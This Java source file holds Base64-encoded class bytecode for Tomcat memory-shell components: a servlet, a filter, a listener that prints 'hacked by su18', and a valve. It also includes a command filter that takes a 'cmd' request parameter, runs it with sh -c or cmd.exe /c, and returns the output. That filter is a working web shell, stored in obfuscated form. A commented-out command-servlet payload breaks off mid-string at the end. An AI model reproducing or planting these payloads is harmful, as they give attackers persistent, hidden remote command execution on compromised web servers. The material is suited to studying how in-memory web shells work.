package com.summer233;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class DynamicUtils {

    public static String SERVLET_CLASS_STRING = "yv66vgAAADQANAoABgAjCwAkACUIACYKACcAKAcAKQcAKgcAKwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQArTG9yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACwBABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAtAQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwACAAJBwAuDAAvADABAARzdTE4BwAxDAAyADMBAClvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0U2VydmxldAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAEABwAAAAYAAQAIAAkAAQAKAAAALwABAAEAAAAFKrcAAbEAAAACAAsAAAAGAAEAAAAJAAwAAAAMAAEAAAAFAA0ADgAAAAEADwAQAAIACgAAADUAAAACAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAWAAIAAAABAA0ADgAAAAAAAQARABIAAQATAAAABAABABQAAQAVABYAAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAASAAwAAAAMAAEAAAACAA0ADgAAAAEAFwAYAAIACgAAAE4AAgADAAAADCy5AAIBABIDtgAEsQAAAAIACwAAAAoAAgAAABcACwAYAAwAAAAgAAMAAAAMAA0ADgAAAAAADAAZABoAAQAAAAwAGwAcAAIAEwAAAAYAAgAUAB0AAQAeAB8AAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAAcAAwAAAAMAAEAAAACAA0ADgAAAAEAIAAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAiAAwAAAAMAAEAAAABAA0ADgAAAAEAIQAAAAIAIg==";

    public static String FILTER_CLASS_STRING = "yv66vgAAADQANwoABwAiCwAjACQIACUKACYAJwsAKAApBwAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHAC0HAC4BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAD1Rlc3RGaWx0ZXIuamF2YQwACQAKBwAvDAAwADEBAA90aGlzIGlzIEZpbHRlciAHADIMADMANAcANQwAFAA2AQAob3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAAYABwABAAgAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQABAAsAAAA1AAAAAgAAAAGxAAAAAgAMAAAABgABAAAAEgANAAAAFgACAAAAAQAOAA8AAAAAAAEAEgATAAEAAQAUABUAAgALAAAAZAADAAQAAAAULLkAAgEAEgO2AAQtKyy5AAUDALEAAAACAAwAAAAOAAMAAAAfAAsAIQATACIADQAAACoABAAAABQADgAPAAAAAAAUABYAFwABAAAAFAAYABkAAgAAABQAGgAbAAMAHAAAAAYAAgAdAB4AAQAfAAoAAQALAAAAKwAAAAEAAAABsQAAAAIADAAAAAYAAQAAACkADQAAAAwAAQAAAAEADgAPAAAAAQAgAAAAAgAh";

    public static String LISTENER_CLASS_STRING = "yv66vgAAADQAVwoAEQArCgAsAC0HAC4KABEALwgAHAoAMAAxCgAyADMKADIANAcANQoACQA2CgA3ADgIADkKADoAOwcAPAoADgA9BwA+BwA/BwBAAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdExpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAB3JlcXVlc3QBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBAA1TdGFja01hcFRhYmxlBwA8AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAEVRlc3RMaXN0ZW5lci5qYXZhDAATABQHAEEMAEIAQwEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGUMAEQARQcARgwARwBIBwBJDABKAEsMAEwATQEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAE4ATwcAUAwAUQBSAQAPCmhhY2tlZCBieSBzdTE4BwBTDABUAFUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABWABQBACpvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0TGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhABAAEQABABIAAAADAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADQAXAAAADAABAAAABQAYABkAAAABABoAGwABABUAAADIAAIABQAAADcrtgACwAADTSy2AAQSBbYABk4tBLYABy0stgAIwAAJOgQZBLYACrYACxIMtgANpwAITSy2AA+xAAEAAAAuADEADgADABYAAAAmAAkAAAAXAAgAGAASABkAFwAaACEAHAAuACAAMQAeADIAHwA2ACMAFwAAAD4ABgAIACYAHAAdAAIAEgAcAB4AHwADACEADQAgACEABAAyAAQAIgAjAAIAAAA3ABgAGQAAAAAANwAkACUAAQAmAAAABwACcQcAJwQAAQAoABsAAQAVAAAANQAAAAIAAAABsQAAAAIAFgAAAAYAAQAAACwAFwAAABYAAgAAAAEAGAAZAAAAAAABACQAJQABAAEAKQAAAAIAKg==";

    public static String VALVE_CLASS_STRING = "yv66vgAAADQAMQoACAAbCgAcAB0IAB4KAB8AIAoABwAhCwAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKUxvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0VmFsdmU7AQAGaW52b2tlAQBSKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0O0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTspVgEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAhyZXNwb25zZQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAApFeGNlcHRpb25zBwAmBwAnAQAKU291cmNlRmlsZQEADlRlc3RWYWx2ZS5qYXZhDAAJAAoHACgMACkAKgEAEkkgY29tZSBoZXJlIGZpcnN0IQcAKwwALAAtDAAuAC8HADAMABAAEQEAJ29yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RWYWx2ZQEAJG9yZy9hcGFjaGUvY2F0YWxpbmEvdmFsdmVzL1ZhbHZlQmFzZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdnZXROZXh0AQAdKClMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTsBABlvcmcvYXBhY2hlL2NhdGFsaW5hL1ZhbHZlACEABwAIAAAAAAACAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAABbAAMAAwAAABUstgACEgO2AAQqtgAFKyy5AAYDALEAAAACAAwAAAAOAAMAAAARAAkAEwAUABQADQAAACAAAwAAABUADgAPAAAAAAAVABIAEwABAAAAFQAUABUAAgAWAAAABgACABcAGAABABkAAAACABo=";

    public static String BASIC_FILTER_CLASS_STRING_BASE64 = "yv66vgAAAEEANwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCwAIAAkHAAoMAAsADAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAA4BABB0aGlzIGlzIGEgZmlsdGVyCgAQABEHABIMABMAFAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCwAWABcHABgMABkAGgEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAAhkb0ZpbHRlcgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHABwBABljb20vc3VtbWVyMjMzL0Jhc2ljRmlsdGVyBwAeAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAG0xjb20vc3VtbWVyMjMzL0Jhc2ljRmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHADEBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAzAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBCYXNpY0ZpbHRlci5qYXZhACEAGwACAAEAHQAAAAQAAQAFAAYAAQAfAAAAMwABAAEAAAAFKrcAAbEAAAACACAAAAAKAAIAAAAMAAQADQAhAAAADAABAAAABQAiACMAAAABACQAJQABAB8AAAA1AAAAAgAAAAGxAAAAAgAgAAAABgABAAAAEQAhAAAAFgACAAAAAQAiACMAAAAAAAEAJgAnAAEAAQAZACgAAgAfAAAAZAADAAQAAAAULLkABwEAEg22AA8tKyy5ABUDALEAAAACACAAAAAOAAMAAAAWAAsAFwATABgAIQAAACoABAAAABQAIgAjAAAAAAAUACkAKgABAAAAFAArACwAAgAAABQALQAuAAMALwAAAAYAAgAwADIAAQA0AAYAAQAfAAAAKwAAAAEAAAABsQAAAAIAIAAAAAYAAQAAABwAIQAAAAwAAQAAAAEAIgAjAAAAAQA1AAAAAgA2";
    public static String BASIC_SEVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCwAIAAkHAAoMAAsADAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAA4BABV0aGlzIGlzIGEgbmV3IFNlcnZsZXQKABAAEQcAEgwAEwAUAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYHABYBACBjb20vc3VtbWVyMjMzL1N1bW1lckJhc2ljU2VydmxldAcAGAEAFWphdmF4L3NlcnZsZXQvU2VydmxldAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9zdW1tZXIyMzMvU3VtbWVyQmFzaWNTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAuAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAF1N1bW1lckJhc2ljU2VydmxldC5qYXZhACEAFQACAAEAFwAAAAYAAQAFAAYAAQAZAAAAMwABAAEAAAAFKrcAAbEAAAACABoAAAAKAAIAAAALAAQADAAbAAAADAABAAAABQAcAB0AAAABAB4AHwACABkAAAA1AAAAAgAAAAGxAAAAAgAaAAAABgABAAAAEAAbAAAAFgACAAAAAQAcAB0AAAAAAAEAIAAhAAEAIgAAAAQAAQAjAAEAJQAmAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAFAAbAAAADAABAAAAAgAcAB0AAAABACcAKAACABkAAABOAAIAAwAAAAwsuQAHAQASDbYAD7EAAAACABoAAAAKAAIAAAAZAAsAHAAbAAAAIAADAAAADAAcAB0AAAAAAAwAKQAqAAEAAAAMACsALAACACIAAAAGAAIAIwAtAAEALwAwAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAIAAbAAAADAABAAAAAgAcAB0AAAABADEABgABABkAAAArAAAAAQAAAAGxAAAAAgAaAAAABgABAAAAJQAbAAAADAABAAAAAQAcAB0AAAABADIAAAACADM=";

    public static String CMD_FILTER_CLASS_STRING_BASE64 = "yv66vgAAAEEAoQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAEHRoaXMgaXMgYSBmaWx0ZXIKABsAHAcAHQwAHgAOAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4HACABACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0CAAiAQADY21kCwAfACQMACUAJgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CAAoAQAHb3MubmFtZQoAKgArBwAsDAAtACYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkKAC8AMAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsIADUBAAN3aW4KAC8ANwwAOAA5AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoIADsBAAJzaAgAPQEAAi1jCAA/AQAHY21kLmV4ZQgAQQEAAi9jCgBDAEQHAEUMAEYARwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoAQwBJDABKAEsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoATQBOBwBPDABQAFEBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAFMBABFqYXZhL3V0aWwvU2Nhbm5lcgoAUgBVDAAFAFYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAFgBAAJcYQoAUgBaDABbAFwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAFIAXgwAXwBgAQAHaGFzTmV4dAEAAygpWgoAUgBiDABjADMBAARuZXh0CABlAQAACgAbAGcMAGgADgEABXdyaXRlCgAbAGoMAGsABgEABWZsdXNoCwBtAG4HAG8MAHAAcQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAAhkb0ZpbHRlcgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHAHMBABdjb20vc3VtbWVyMjMzL0NNREZpbHRlcgcAdQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMY29tL3N1bW1lcjIzMy9DTURGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADVN0YWNrTWFwVGFibGUHAIUHAJYBABNqYXZhL2lvL0lucHV0U3RyZWFtBwCYAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEACkV4Y2VwdGlvbnMHAJsBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwCdAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAA5DTURGaWx0ZXIuamF2YQAhAHIAAgABAHQAAAAEAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAQB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAAEAcAB/AAIAdgAAAewABQALAAAA2SwSB7kACQIALBIPuQARAgAsuQAUAQASGLYAGivAAB86BBkEEiG5ACMCAMYApgQ2BRInuAApOgYZBsYAExkGtgAuEjS2ADaZAAYDNgUVBZkAIAa9AC9ZAxI6U1kEEjxTWQUZBBIhuQAjAgBTpwAdBr0AL1kDEj5TWQQSQFNZBRkEEiG5ACMCAFM6B7gAQhkHtgBItgBMOgi7AFJZGQi3AFQSV7YAWToJGQm2AF2ZAAsZCbYAYacABRJkOgosuQAUAQAZCrYAZiy5ABQBALYAabEtKyy5AGwDALEAAAADAHcAAABOABMAAAAaAAgAGwAQABwAGwAdACEAHgAtAB8AMAAgADcAIQBJACIATAAkAG4AJQCKACYAlwAnAKcAKAC7ACkAxgAqAM8AKwDQAC0A2AAuAHgAAABwAAsAMACgAIAAgQAFADcAmQCCAIMABgCKAEYAhACFAAcAlwA5AIYAhwAIAKcAKQCIAIkACQC7ABUAigCDAAoAAADZAHkAegAAAAAA2QCLAIwAAQAAANkAjQCOAAIAAADZAI8AkAADACEAuACRAJIABACTAAAANwAG/gBMBwAfAQcALyFZBwCU/gAuBwCUBwCVBwBSQQcAL/8AFgAFBwByBwCXBwAKBwBtBwAfAAAAmQAAAAYAAgCaAJwAAQCeAAYAAQB2AAAAKwAAAAEAAAABsQAAAAIAdwAAAAYAAQAAADIAeAAAAAwAAQAAAAEAeQB6AAAAAQCfAAAAAgCg";
    // public static String SUMMER_CMD_SERVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAAdjbWRsaW5lCwAfACQMACUAJgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CAAoAQAHb3MubmFtZQoAKgArBwAsDAAtACYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkKAC8AMAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsIADUBAAN3aW4KAC8ANwwAOAA5AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoIADsBAAJzaAgAPQEAAi1jCAA/AQAHY21kLmV4ZQgAQQEAAi9jCgBDAEQHAEUMAEYARwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoAQwBJDABKAEsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoATQBOBwBPDABQAFEBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAFMBABFqYXZhL3V0aWwvU2Nhbm5lcgoAUgBVDAAFAFYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAFgBAAJcYQoAUgBaDABbAFwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcj